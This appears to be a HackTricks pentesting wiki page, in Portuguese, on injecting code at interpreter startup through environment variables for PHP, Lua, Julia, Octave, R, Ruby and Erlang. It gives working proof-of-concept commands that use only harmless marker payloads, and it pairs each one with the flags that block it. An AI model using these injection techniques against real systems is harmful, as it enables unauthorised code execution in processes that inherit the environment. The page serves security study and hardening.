# Injeção na inicialização de interpretadores do macOS via variáveis de ambiente

{{#include ../../../banners/hacktricks-training.md}}

Estas técnicas específicas de runtime usam variáveis de ambiente herdadas para selecionar configurações de inicialização, pré-carregar código ou fornecer flags da VM antes da carga de trabalho pretendida. Algumas variantes usam arquivos; Lua e Erlang também permitem a execução de código inline.

## Configuração de inicialização do PHP

### `PHPRC` / `PHP_INI_SCAN_DIR` e `auto_prepend_file`

O PHP CLI e o CGI leem a configuração a cada invocação. `PHPRC` pode selecionar um `php.ini` legível pelo atacante, enquanto `PHP_INI_SCAN_DIR` pode redirecionar o diretório verificado em busca de arquivos `.ini` adicionais. A diretiva `auto_prepend_file` faz o PHP analisar um arquivo antes do script solicitado, tornando essa combinação uma forma de execução de código na inicialização.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

Uma alternativa é um diretório que contém um arquivo `.ini`:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

A opção `-n` ignora o `php.ini`; um caminho confiável especificado com `-c` tem precedência sobre `PHPRC`. Lembre-se de que um SAPI de servidor de longa duração normalmente lê a configuração quando o servidor web é iniciado, enquanto CLI e CGI fazem isso a cada invocação.<sup>[[1]](#references)</sup>

## Código de inicialização do Lua

### `LUA_INIT`

Antes de processar as opções de linha de comando ou o script de destino, o interpretador Lua independente executa `LUA_INIT_<major>_<minor>` ou, se a variável versionada estiver ausente, `LUA_INIT`. Um valor que começa com `@` indica um arquivo; qualquer outro valor é avaliado diretamente como código Lua. Isso permite a execução na inicialização tanto a partir de um arquivo quanto sem arquivo.<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

O nome versionado exato varia conforme o interpretador, por exemplo, `LUA_INIT_5_4`. `lua -E` ignora todas as variáveis de ambiente, incluindo o código de inicialização e os caminhos dos módulos Lua.

## Depot de inicialização do Julia

### `JULIA_DEPOT_PATH` e `startup.jl`

Normalmente, o Julia executa `config/startup.jl` do primeiro depot na inicialização. `JULIA_DEPOT_PATH` controla a lista de depots; portanto, apontá-lo para uma árvore legível pelo atacante redireciona o arquivo de inicialização carregado automaticamente.<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

O separador final é útil quando a vítima ainda precisa dos pacotes normais. `julia --startup-file=no` desativa esse startup file. Limpe a variável antes da inicialização, pois ela também controla registros de pacotes, ambientes, caches e locais de carregamento de código.

## Arquivos de inicialização do GNU Octave

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

O GNU Octave executa vários arquivos que contêm comandos Octave válidos durante a inicialização. `OCTAVE_SITE_INITFILE` substitui o arquivo de inicialização de todo o site, e `OCTAVE_VERSION_INITFILE` substitui o específico da versão, permitindo que qualquer uma das variáveis redirecione a execução automática para um arquivo que o atacante possa ler.<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` ignora apenas arquivos do usuário, como `~/.octaverc`; ele **não** impede a substituição do arquivo de site acima. Use `--no-site-file` para os arquivos de site ou `--norc` / `-f` para desativar todos os arquivos de inicialização.<sup>[[7]](#references)</sup>

## Perfis de inicialização do R e carregamento de pacotes

### `R_PROFILE_USER` / `R_PROFILE`

Na inicialização, o R carrega arquivos de perfil de site e do usuário que contêm código R. `R_PROFILE` seleciona o perfil de site e `R_PROFILE_USER` seleciona o perfil do usuário, permitindo que um ambiente herdado redirecione qualquer uma das buscas para um arquivo legível pelo atacante.<sup>[[8]](#references)</sup>

```bash
echo 'file.create("/tmp/r-profile-executed")' >/tmp/attacker.Rprofile
R_PROFILE_USER=/tmp/attacker.Rprofile Rscript victim.R
```

`--no-init-file` ignora o perfil do usuário, `--no-site-file` ignora o perfil do site, e `--vanilla` inclui ambas as proteções. Primeiro, R processa os arquivos de ambiente selecionados por `R_ENVIRON` e `R_ENVIRON_USER`, mas esses arquivos apenas definem variáveis; as variáveis de perfil são o mecanismo direto para execução de código arbitrário.

### `R_DEFAULT_PACKAGES` / `R_SCRIPT_DEFAULT_PACKAGES` e caminhos de bibliotecas

R anexa os pacotes separados por vírgulas em `R_DEFAULT_PACKAGES` durante a inicialização. `Rscript` dá preferência a `R_SCRIPT_DEFAULT_PACKAGES`. Combinar qualquer uma dessas variáveis com `R_LIBS`, `R_LIBS_USER` ou `R_LIBS_SITE` pode fazer com que R encontre e carregue um pacote instalado controlado por um atacante; seu hook `.onLoad` ou `.onAttach` é executado automaticamente.<sup>[[8]](#references)[[9]](#references)</sup>

```bash
# Assume an installed package named htpayload exists below /tmp/r-library.
R_LIBS_USER=/tmp/r-library \
R_DEFAULT_PACKAGES=htpayload \
R --no-save --no-restore --silent

R_LIBS_USER=/tmp/r-library \
R_SCRIPT_DEFAULT_PACKAGES=htpayload \
Rscript victim.R
```

Isso requer um pacote R instalado estruturalmente válido, não apenas um arquivo `.R` avulso. `--vanilla` não limpa variáveis herdadas diretamente, então um wrapper confiável deve remover ou substituir as variáveis de pacote padrão e de caminho de bibliotecas, além de desativar os arquivos de perfil.

## Opções do loader do Ruby

### RUBYOPT

O Ruby analisa as opções de linha de comando compatíveis da variável de ambiente `RUBYOPT` antes de executar um script. O Ruby rejeita a execução de código por meio de `-e` em `RUBYOPT`, mas `-I` pode adicionar um diretório ao caminho de busca de bibliotecas e `-r` pode carregar uma biblioteca. Portanto, um processo que inicia o Ruby com variáveis de ambiente controladas pelo atacante pode ser induzido a carregar código Ruby controlado pelo atacante.<sup>[[10]](#references)</sup>

Crie `/tmp/inject.rb`:

```ruby:inject.rb
puts `whoami`
```

Crie um script Ruby benigno, como `hello.rb`:

```ruby:hello.rb
puts 'Hello, World!'
```

Execute-o com um valor controlado de `RUBYOPT`:

```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```

Para desativar esse comportamento, passe `--disable=rubyopt` (ou `--disable-rubyopt`) **antes** do nome do script:<sup>[[10]](#references)</sup>

```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```

Uma opção escrita após `hello.rb` é passada ao script em `ARGV`; ela não desativa o processamento anterior de `RUBYOPT` pelo Ruby.<sup>[[10]](#references)</sup>

```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```

### RUBYLIB

Em vez de antepor o diretório de carregamento usando `-I` em `RUBYOPT`, a variável de ambiente separada `RUBYLIB` adiciona diretórios ao `$LOAD_PATH` do Ruby. Combinada com `RUBYOPT=-r<module>`, ela carrega código do atacante sem precisar de `-I` em `RUBYOPT`:<sup>[[10]](#references)</sup>

```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```

## Flags da VM Erlang e Elixir

### `ERL_AFLAGS`, `ERL_FLAGS` e `ERL_ZFLAGS`

O lançador `erl` adiciona `ERL_AFLAGS` ao início da linha de comando e `ERL_FLAGS` / `ERL_ZFLAGS` ao final. Como `-eval` avalia uma expressão Erlang durante a inicialização da VM, essas variáveis podem permitir a execução de código sem arquivos antes da carga de trabalho pretendida.<sup>[[11]](#references)</sup>

```bash
ERL_AFLAGS="-noshell -eval 'file:write_file(\"/tmp/erl-aflags-executed\", <<\"ok\">>).' -s init stop" erl
```

Elixir, Mix, Phoenix e muitas releases do Elixir acabam iniciando a Erlang VM e podem herdar essas flags. Confirme o wrapper exato da release: ele pode reconstruir ou sanitizar os argumentos da VM, enquanto algumas ferramentas oferecem suporte explícito a `ERL_AFLAGS`, `ERL_ZFLAGS` ou `ELIXIR_ERL_OPTIONS`.<sup>[[12]](#references)</sup>

Ao contrário da maioria das técnicas baseadas em arquivos, o payload `-eval` não precisa de um arquivo controlado pelo atacante. Um wrapper confiável deve limpar as três variáveis de flags do Erlang (e `ELIXIR_ERL_OPTIONS` para Elixir) antes de iniciar o runtime; não tente permitir flags individuais da VM, a menos que o parser e a ordem sejam totalmente compreendidos.

## References

- [1] [Arquivo de configuração do PHP](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Interpretador standalone do Lua 5.4](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Interface de linha de comando do Julia: arquivo de inicialização](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Variáveis de ambiente do Julia: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [Arquivos de inicialização do GNU Octave](https://docs.octave.org/latest/Startup-Files.html)
- [7] [Opções de linha de comando do GNU Octave](https://docs.octave.org/latest/Command-Line-Options.html)
- [8] [Inicialização de uma sessão do R](https://stat.ethz.ch/R-manual/R-devel/library/base/html/Startup.html)
- [9] [Instalação e administração do R: pacotes adicionais](https://stat.ethz.ch/CRAN/doc/manuals/r-release/R-admin.html)
- [10] [Documentação do Ruby - opções de linha de comando do Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
- [11] [Comando `erl` e variáveis de ambiente](https://www.erlang.org/doc/apps/erts/erl_cmd.html)
- [12] [Releases do Elixir e opções de ambiente da VM](https://hexdocs.pm/elixir/releases.html#operating-system-scripts)
{{#include ../../../banners/hacktricks-training.md}}
